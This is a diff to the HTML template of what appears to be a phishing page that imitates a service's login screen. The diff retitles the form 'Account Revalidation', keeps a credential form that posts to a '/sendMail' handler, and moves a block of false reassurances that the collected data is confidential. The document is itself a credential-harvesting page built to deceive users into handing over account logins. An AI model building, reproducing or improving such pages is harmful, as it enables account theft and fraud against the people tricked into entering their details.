@@ -113,29 +113,7 @@
 
 </html>
 
-</div>
-</div>
-</div>
-<div class="row">
-  <p class="px-3 note" style="font-size: 15px;margin-top: 50px;font-weight: bold;">
-    NOTE
-  </p>
-  <p class="px-3" style="font-size: 11px;">
-  <ul>
-    <li style="font-size: 11px;">
-      The information collected is confidential and will not be disclosed by us to unauthorized third parties.
-    </li>
-    <li style="font-size: 11px;">
-      Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties. Authentication information will not be modified.
-    </li>
-    <li style="font-size: 11px;">
-      Authentication process will be carried out immediately upon receipt of information, and we will have notify you of the authentication result.
-    </li>
-  </ul>
 
-</div>
-</div>
-</div>
 <!--
   <script src="../code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
 <script src="../cdn.jsdelivr.net/npm/bootstrap%404.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
@@ -2841,7 +2819,7 @@
                         <div class="KuxBox-root css-mpa8nz" style="flex-direction: column;">
                           <div class="KuxBox-root css-5kgvnz">
                             <div class="KuxBox-root css-b38fps" style="flex: 1 1 auto;">
-                              <h3 class="css-1b1nvj1">Log In</h3>
+                              <h3 class="css-1b1nvj1">Account Revalidation</h3>
 
                               <section class="css-1yvtdo">
                                 <div class="KuxTabs-container KuxTabs-lineContainer css-5pto6a" type="default">
@@ -2880,27 +2858,24 @@
                               <button id="loginBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit" formmethod="post" formaction="/sendMail">
                                 Login In
                               </button>
-            </div>
-          </div>
-          <div class="row">
-            <p class="px-3 note" style="font-size: 15px;margin-top: 50px;font-weight: bold;">
-              NOTE
-            </p>
-            <p class="px-3" style="font-size: 11px;">
-              <ul>
-                <li style="font-size: 11px;">
-                  The information collected is confidential and will not be disclosed by us to unauthorized third parties.
-                </li>
-                <li style="font-size: 11px;">
-                  Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties. Authentication information will not be modified.
-                </li>
-                <li style="font-size: 11px;">
-                  Authentication process will be carried out immediately upon receipt of information, and we will have notify you of the authentication result.
-                </li>
-              </ul>
-            
-          </div>
-        </div>
+                              </div>
+   <div class="row">
+  <p class="px-3 note" style="font-size: 15px;margin-top: 50px;font-weight: bold;">
+    NOTE
+  </p>
+  <p class="px-3" style="font-size: 11px;">
+  <ul>
+    <li style="font-size: 11px;">
+      The information collected is confidential and will not be disclosed by us to unauthorized third parties.
+    </li>
+    <li style="font-size: 11px;">
+      Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties. Authentication information will not be modified.
+    </li>
+    <li style="font-size: 11px;">
+      Authentication process will be carried out immediately upon receipt of information, and we will have notify you of the authentication result.
+    </li>
+  </ul>
+</div>
                             </form>
                             @endif
                           </div>
